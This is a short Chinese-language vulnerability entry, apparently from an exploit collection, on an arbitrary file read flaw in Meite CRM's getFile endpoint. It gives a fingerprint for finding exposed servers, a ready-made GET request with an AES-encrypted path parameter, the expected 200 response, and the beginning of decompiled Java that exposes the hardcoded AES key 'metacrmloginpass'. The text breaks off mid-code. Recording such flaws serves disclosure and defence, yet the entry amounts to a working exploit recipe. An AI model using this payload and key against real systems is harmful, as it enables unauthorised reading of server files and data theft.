# 美特CRMgetFile存在任意文件读取漏洞

- **系统**：美特　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="/common/scripts/basic.js"`
- **请求**：`GET /getFile?p=b9998b5475349fb121bb1c747c459f55427b7cbfdb484a28fbd4d9d992ab442923a2d0e2c189c9bae4c35e342dbb652c0711d79544ffef547bdbda75a26a27c6 HTTP/1.1`
- **预期**：200　|　—

**其他**
- 漏洞分析: | 看下AES加解密的部分<br/>public class AesEcbCipher {<br/>    private static final String SECRET_KEY = "metacrmloginpass";<br/>    private byte[] key = "metacrmloginpass".getBytes();<br/><br/>    public AesEcbCipher(String secretKey) {<br/>        this.key = secretKey.getBytes();<br/>    }<br/><br/>    public AesEcbCipher() {<br/>    }<br/><br/>    public String Encrypt(String sSrc) {<br/>        try {<br